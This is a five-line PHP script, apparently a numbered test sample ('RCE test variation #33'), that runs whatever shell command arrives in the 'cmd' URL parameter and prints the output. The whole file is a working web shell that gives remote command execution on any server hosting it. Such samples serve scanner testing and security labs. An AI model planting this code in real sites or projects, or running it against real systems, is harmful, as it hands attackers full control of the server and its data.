<?php
// RCE test variation #33
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>